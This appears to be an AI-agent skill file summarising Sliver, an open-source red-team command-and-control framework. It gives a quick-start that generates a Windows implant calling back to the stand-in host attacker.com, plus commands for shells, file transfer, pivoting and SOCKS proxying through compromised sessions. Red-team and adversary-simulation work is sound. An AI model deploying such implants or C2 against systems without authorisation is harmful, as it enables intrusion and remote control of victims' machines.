---
name: sliver
description: "Sliver: open-source adversary simulation C2 framework by BishopFox supporting mTLS, WireGuard, HTTP/S, and DNS transports with per-binary asymmetric encryption. Use when deploying C2 implants, generating cross-platform beacons, managing multi-operator engagements, or executing BOFs via the armory."
license: GPL-3.0
compatibility: "Linux / macOS / Windows server. Implants: Windows, Linux, macOS. Go 1.20+ for source build."
metadata:
  author: AeonDave
  version: "1.0"
---

# Sliver

Open-source C2: mTLS, WireGuard, HTTP/S, DNS.

## Quick Start

```bash
./sliver-server
./sliver-client

generate --http https://attacker.com --os windows --arch amd64 --save implant.exe
https -l 443 -d attacker.com
use <session-id>
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `generate` | Build new implant |
| `generate beacon` | Async beacon with check-in interval |
| `jobs` | List active listeners |
| `sessions` | List active sessions |
| `use <id>` | Interact with session |
| `shell` | Spawn interactive shell |
| `execute <cmd>` | Run command |
| `download / upload` | File transfer |
| `portfwd add` | Port forwarding |
| `socks5 start` | SOCKS5 proxy via session |
| `armory` | Install BOF/extension packs |

## Transport Options

| Transport | Flag |
|-----------|------|
| mTLS | `--mtls <host>:<port>` |
| HTTP/S | `--http <url>` |
| WireGuard | `--wg <host>:<port>` |
| DNS | `--dns <domain>` |

## Resources

| File | When to load |
|------|--------------|
| `references/` | BOF execution, multiplayer setup, OPSEC notes |
